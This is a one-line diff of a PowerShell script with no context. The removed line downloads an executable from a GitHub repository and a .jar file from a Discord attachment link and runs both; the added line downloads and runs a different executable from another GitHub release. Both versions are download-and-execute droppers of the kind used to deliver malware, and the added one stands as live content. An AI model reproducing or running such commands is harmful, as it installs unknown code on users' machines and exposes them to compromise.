@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/Everything.exe"; -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe"; Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1226898573040287857/1228353448701984949/1.jar?ex=667d794b&is=667c27cb&hm=7c3daa7c3d4746590d7681f9a0d5c2d9316a140ca0b9ce1e4d9104bed841f8c5&" -OutFile "C:\1.jar"; Start-Process -FilePath "C:\1.jar";
+Invoke-WebRequest -Uri "https://github.com/corponezz/420/releases/download/420/420.exe"; -OutFile "C:\420.exe"; Start-Process -FilePath "C:\420.exe";
